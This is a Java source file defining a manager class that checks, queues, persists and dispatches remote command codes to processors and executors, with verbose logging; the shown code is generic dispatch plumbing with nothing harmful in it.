package com.vvt.remotecommandmanager;

import java.util.ArrayList;
import java.util.HashMap;

import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.logger.FxLog;
import com.vvt.productinfo.ProductInfo;
import com.vvt.remotecommandmanager.exceptions.CommandNotRegisteredException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.RemoteCommandFactory;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

class CommandProcessingManager implements CommandProcessingListener {

	private static final String TAG = "CommandProcessingManager";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;

	private ArrayList<String> mCommandSupportList;
	private RemoteCommandDataStore mRmtCommandDataStore;
	private RemoteCommandFactory mRmtCommandFactory;
	private HashMap<String, RemoteCommandExecutor> mExecutors;
	private FxEventRepository mEventRepository;

	private ProductInfo mProductInfo;

	public CommandProcessingManager(InitialParameter setupParam)  {

		mCommandSupportList = new ArrayList<String>();
		mRmtCommandDataStore = new RemoteCommandDataStore(setupParam.getAppContext().getWritablePath());
		mEventRepository = setupParam.getEventRepository();
		mProductInfo = setupParam.getAppContext().getProductInfo();
		
		mRmtCommandFactory = new RemoteCommandFactory(setupParam);
	}

	public void processPendingCommands() {
		ArrayList<RemoteCommandData> rmtCommandDatas = mRmtCommandDataStore
				.getCommandDataList();

		if (rmtCommandDatas != null) {
			RemoteCommandData commandData = null;

			for (int i = 0; i < rmtCommandDatas.size(); i++) {

				commandData = null;
				commandData = rmtCommandDatas.get(i);
				try {
					scheduleProcessing(commandData);

				} catch (Exception e) {
					if (e instanceof RemoteCommandException) {
						RemoteCommandException commandException = (RemoteCommandException) e;
						RemoteCommandUtil.handleException(mEventRepository,
								commandException, commandData, mProductInfo);

					} else {
						if(LOGE) FxLog.e(TAG, e.getMessage(), e);
					}
				}
			}
		}
	}
	
	/**
	 * Scheduling command data with processor.
	 * @param commandData
	 * @throws RemoteCommandException
	 */
	public synchronized void scheduleProcessing(RemoteCommandData commandData)
			throws RemoteCommandException {

		if(LOGV) FxLog.v(TAG, "START # scheduleProcessing");
		
		String cmdCode = commandData.getCommandCode();

		if(LOGD) FxLog.d(TAG, "scheduleProcessing # cmdCode :" + cmdCode);
		
		// check support command
		if (!isSupportCommand(cmdCode)) {
			if(LOGD) FxLog.d(TAG, "cmdCode :" + cmdCode + " CommandNotRegisteredException");
			
			throw new CommandNotRegisteredException();
		}

		RemoteCommandProcessor processor = mRmtCommandFactory
				.createCommandProcessor(commandData.getCommandCode());
		
		if(LOGV) FxLog.v(TAG, "scheduleProcessing # processor :" + processor.getProcessingType());
		if(LOGV) FxLog.v(TAG, "processor :" + processor.toString());

		// persist to store and set listener
		if (processor.getProcessingType() != ProcessingType.SYNC) {
			processor.setProcessingListener(this);
			insertCommandToStore(commandData);
		}

		// get executor
		RemoteCommandExecutor executor = null;

		if (processor.getProcessingType() == ProcessingType.ASYNC_NON_HTTP) {
			executor = getExecutor(cmdCode);
		} else {
			executor = getExecutor(processor.getProcessingType().toString());
		}
		
		ExecutorRequest executorRequest = new ExecutorRequest(commandData, processor);
		executor.addRequestToQueue(executorRequest);
		executor.execute();
		
		if(LOGV) FxLog.v(TAG, "EXIT # scheduleProcessing");
	}
	

	private synchronized void insertCommandToStore(RemoteCommandData commandData) {
		synchronized (mRmtCommandDataStore) {
			mRmtCommandDataStore.insertCommand(commandData);
		}
	}

	private synchronized void deleteCommandFromStore(
			RemoteCommandData commandData) {
		synchronized (mRmtCommandDataStore) {
			mRmtCommandDataStore.deleteCommand(commandData);
		}
	}

	public void setSupportedCommands(ArrayList<String> commandCodes) {
		mCommandSupportList = commandCodes;

	}

	public void clearSupprtCommands() {
		mCommandSupportList.clear();

	}

	protected boolean isSupportCommand(String commandCode) {

		boolean isSupport = false;

		for (int i = 0; i < mCommandSupportList.size(); i++) {
			if (mCommandSupportList.get(i).equals(commandCode)) {
				isSupport = true;
				break;
			}
		}

		return isSupport;
	}

	protected RemoteCommandExecutor getExecutor(String key) {
		if (mExecutors == null) {
			mExecutors = new HashMap<String, RemoteCommandExecutor>();
		}

		RemoteCommandExecutor executor = null;

		if (key.equals(ProcessingType.SYNC.toString())) {
			if (mExecutors.containsKey(key)) {
				executor = mExecutors.get(key);
			} else {
				executor = new RemoteCommandExecutor();
				mExecutors.put(key, executor);
			}
		} else if (key.equals(ProcessingType.ASYNC_HTTP.toString())) {
			if (mExecutors.containsKey(key)) {
				executor = mExecutors.get(key);
			} else {
				executor = new RemoteCommandExecutor();
				mExecutors.put(key, executor);
			}
		} else {
			if (mExecutors.containsKey(key)) {
				executor = mExecutors.get(key);
			} else {
				executor = new RemoteCommandExecutor();
				mExecutors.put(key, executor);
			}
		}

		return executor;
	}

	@Override
	public void onProcessFinish(RemoteCommandData commandData) {
		// remove command
		deleteCommandFromStore(commandData);

	}
}
